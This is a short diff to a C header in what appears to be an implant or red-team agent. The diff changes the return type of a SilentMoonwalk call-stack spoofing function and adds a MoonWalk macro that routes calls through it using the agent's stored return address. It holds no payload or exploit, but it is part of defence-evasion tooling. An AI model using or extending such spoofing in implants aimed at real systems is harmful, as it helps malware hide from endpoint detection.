@@ -3,4 +3,11 @@
 #include "SilentMoonwalkCommon.h"
 #include "Spoof.h"
 
-BOOL SilentMoonwalkMain(PVOID FunctionPointer, PArgs args, PVOID RetAddr);
+PVOID SilentMoonwalkMain(PVOID FunctionPointer, PArgs args, PVOID RetAddr);
+
+
+#define MoonWalk( pFunc, pArgs )                                                       \
+    if(1){                                                                             \
+        SilentMoonwalkMain((PVOID)pFunc, (PArgs)pArgs, agent->Walker->RetAddr);        \
+                                                                                       \
+    }
